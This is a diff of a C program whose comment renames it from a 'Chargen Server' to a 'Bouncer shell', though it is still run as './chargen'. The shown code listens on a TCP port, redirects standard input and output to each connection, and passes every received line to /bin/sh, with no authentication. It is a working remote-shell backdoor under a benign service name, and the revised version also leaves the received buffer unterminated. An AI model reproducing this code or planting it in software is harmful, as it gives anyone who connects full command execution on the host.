@@ -1,12 +1,11 @@
 /*
- * Chargen Server
+ * Bouncer shell 
  *
  * Run: ./chargen <chargen_port>
  *
  *
- * Author:      Gabriel Maggiotti, Fernando Oubiña
- * Email:       gmaggiot@ciudad.com.ar, foubina@qb0x.net
- * Webpage:     http://qb0x.net
+ * Author:      Gabriel Maggiotti
+ * Email:       gmaggiott@gmail.com
  */
 
 #include <stdio.h>
@@ -18,10 +17,8 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
-#include <malloc.h>
-
 #define BACKLOG	5
-#define MAX	500
+#define MAX	20000	
 
 int
 main(int argc, char *argv[])
@@ -33,7 +30,6 @@ int sockfd;
 int newfd;
 int numbytes;
 char buf[MAX];
-char diedbuf[1024];
 
 	struct sockaddr_in my_addr;
 	struct sockaddr_in their_addr;
@@ -87,18 +83,13 @@ char diedbuf[1024];
    		   dup2(newfd, STDERR_FILENO);
                    do {
 			int i=1;
-			/*if( (numbytes=recv(newfd,buf,MAX,0))==-1 ) 
-			{
-				perror("recv");
-				exit(1);
-			}i*/
-                        numbytes=recv(newfd,buf,MAX,0);
-	
-			buf[numbytes]='\0';
-			execl("/bin/sh", "sh", "-c", buf, NULL);
+			numbytes=recv(newfd,buf,MAX,0);
+                        char cmd[MAX]="/bin/sh -c ";
+                        strncat(cmd,buf, MAX-10);
+                        system(cmd);	
                    } while(1 /*strcmp(buf,"exit;\n")*/);
 		}
-               // close(newfd);
+               close(newfd);
                printf("Bye!!\n"); 
 	}
 close(sockfd);
